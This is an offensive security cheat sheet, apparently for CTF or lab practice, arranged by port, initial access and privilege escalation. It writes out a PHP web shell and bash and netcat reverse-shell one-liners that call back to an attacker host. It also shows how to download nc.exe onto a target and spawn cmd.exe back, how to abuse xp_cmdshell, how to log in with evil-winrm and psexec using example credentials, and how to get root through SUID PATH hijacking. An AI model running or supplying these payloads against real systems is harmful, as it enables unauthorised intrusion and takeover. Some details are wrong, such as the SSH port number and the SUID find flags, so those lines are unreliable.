# Cyber Security Notes

## Tools
- OpenVPN
- nmap
- smbclient
- Sublime Text
- redis-tools
- gobuster
- mysql
- wordlists from SecLists and naive hashcat
  - directory-list-2.3-medium.txt
  - rockyou.txt
- john the ripper
- responder
- evil-winrm
- peass
- bloodhound
- kerbrute

## Brute Forcing
### Tools
#### Z3
- Z3 is a theorem prover from Microsoft Research that makes it very easy to brute force questions by specifing rules.
- Can be accessed through Python bindings.

## Vulnerability Scanning
### Port 21
#### FTP
- Use ftp (get to grab files)
- FTP code 230 will be returned in nmap scan if anonymous login is allowed
#### Telnet
- Use telnet

### Port 21
#### SSH
Sometimes when using SSH, the following error might pop up
```bash
no matching host key type found. Their offer: ssh-dss
```

It can be solved using
```bash
ssh -oHostKeyAlgorithms=+ssh-dss root@127.0.0.1
```

SSH might deny your connection due to it only accepting authorized keys. If you have access to `.ssh/authorized_keys` in the target machine, you can add your own public key to it so your SSH connection will be allowed. You can generate your public key using the following command
```bash
cat ~/.ssh/id_rsa.pub
```

### Port 80
#### Apache
It can be useful take a look at the Apache log file if you are able to access it.
It can be located in a bunch of different locations, the following command can be used to try and locate it.
```bash
find / -type d -name 'httpd' 2>/dev/null
```

### Ports 445
Usually associated with file sharing (SMB)
- Sensitive info tend to be stored in these areas
- Use smbclient to show available shares and access them
- WorkShares can occasionally be logged into without a password
- E.g. smbclient //127.0.0.1/SHARE$

List shares
```bash
smbclient -N -L //127.0.0.1/
```

### Port 1433
Usually associated with SQL

```xp_cmdshell``` is an extended stored procedure of Microsoft SQL Server that can be used in order to spawn a Windows command shell.
  - Can be used to run powershell with ```xp_cmdshell "powershell -c whoami"```

```impacket-mssqlclient``` can be used in order to establish an authenticated connection to a Microsoft SQL Server.

### Port 5985
Usually associated with Windows Remote Management (winrm).

```evil-winrm``` can be used with user credentials to get a shell on the target machine. E.g.
```bash
evil-winrm -u administrator -p password123 -i $TARGET_IP
```

### Port 6379
Usually associated with redis
- Accessed using redis-cli
- redis is an in-memory database
- Use info to list all databases, then use select `id` to select a database by its id
- Use keys * to get all keys, then get `keyname` to get the corresponding value

## Initial Access
### Simple PHP Payload
> Use + instead of spaces due to URL encoding when sending commands through URL
```php
<?php
  echo system($_GET['c']);
?>
```

### Reverse Shells
> A PHP reverse shell script can be found in usr/share/webshells/php/php-reverse-shell.php

#### Simple Reverse Shell (bash)
```bash
bash -c "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"
```

#### Simple Reverse Shell (netcat)
One simple way to get a reverse shell on the target machine is using netcat. First, we need to make sure that the target's machine has it installed. If not, we can drop a nc.exe binary on our target machine using ```wget```. For windows machines, this binary can be found in ```usr/share/windows-binaries```.

##### Getting our nc.exe binary on the target machine
1. Start a http server on our machine in the same directory as our binary with ```python -m http.server 80```.
2. Get our host ip using ```ifconfig```.
3. On our target machine using powershell, we run ```wget http://$HOST_IP/nc.exe -outfile nc.exe```. Make sure you are in a directory that is writable to.

##### Using netcat to get a simple reverse shell
1. Start listening with netcat on our host machine with ```nc -lvnp 8044```.
2. On our target machine using powershell, we run ```./nc.exe -e cmd.exe $HOST_IP 8044```

```-e cmd.exe``` means execute cmd.exe as it sends it back to us.

Sometimes, -e is not supported. It simply doesn't exist.
The solution is to redirect the stdin/stdout communication through a pipe.
###### Netcat OpenBsd
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

###### Netcat BusyBox
```bash
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

Both of these will create a pipe /tmp/f and continuously read from it with cat. This continuous read output will be piped to /bin/sh as input. 2>&1 means that stderr will be piped to stdout. stdout from the shell will then be piped to us through netcat. Our inputs through netcat will then be piped back to /tmp/f, thus forming a loop.

### Spawning a Stable Shell
> This requires that you already have a reverse shell on the target machine

First, spawn a bash shell on the target machine

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

Then, we will send our nc process to the background with ```CTRL-Z```

On our host machine, we will then run
```bash
stty raw -echo; fg
```
The dash means "disable" a setting, so -echo disables echoing. The raw setting means that the input and output is not processed, just sent straight through. So with stty raw you can't hit Ctrl-C to end a process, for example. This helps to make the shell more stable.
We then bring our nc process back to the foreground with ```fg```

Finally, on our target machine we will run
```bash
export TERM=xterm
```
This will set the terminal emulator to the Ubuntu default of xterm.
From here on out, we should have successfully spawned a stable shell.

### Authentication with User Credentials
#### User Credentials and Writable SMB Shares
We can use ```impacket-psexec``` as a way to exploit writable shares on samba to get a way to authenticate to the machine. E.g.
```bash
impacket-psexec administrator:password123@$TARGET_IP
```

### Common Web Server Setups
> The code for the web server itself can often be found in ```var/www```

Often after successfully spawning a reverse shell on a web server we will find ourselves as the user ```www-data```, which is the user web servers use by default for normal operation.

## Privilege Escalation
### Running as Root
You can use ```sudo -l``` to look for binaries that users are allowed to run as root.

### SUID Binaries
Occasionally there will be binaries being run on the target machine with the SUID bit. The following command can be used to search for such binaries.
```bash
find / -perm 6000 -type f 2>/dev/null
```

- find: a Linux command to search for files in a directory hierarchy
- perm: is used to define the permissions to search for
- u=s: search for files with the SUID permission
- type f: search for regular file
- 2>dev/null: errors will be deleted automatically

#### Abusing SUID Binaries
> You can use ```bash -p``` to run bash while keeping elevated permissions

We can use strings on the binary to see what other binaries it runs, then replace those binaries with our own which will then be run with elevated permissions.
For example, lets pretend that our binary has the line ```cat stuff```.
We can then create our own "cat" with ```echo "/bin/sh" > cat``` and mark it as executable with ```chmod +x cat```.
Finally, we can modify our path with ```export PATH=YOUR_PATH_HERE:$PATH```, which will cause the binary to look in our path for a cat executable first, thus running our malicious cat instead of the original one and giving us a shell with elevated permissions.

### Cron Jobs and Process
Sometimes, root may run certain cron jobs or processes periodically. You can check running cron jobs with ```cat /etc/crontab``` or you can simply use ```pspy``` to spy on currently running cron jobs and processes, including the commands used to invoke them initially.

## Useful URLS
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://github.com/undergroundwires/CEH-in-bullet-points
- https://github.com/JohnHammond/ctf-katana
- https://gtfobins.github.io/
- https://github.com/740i/pentest-notes/blob/master/windows-privesc.md
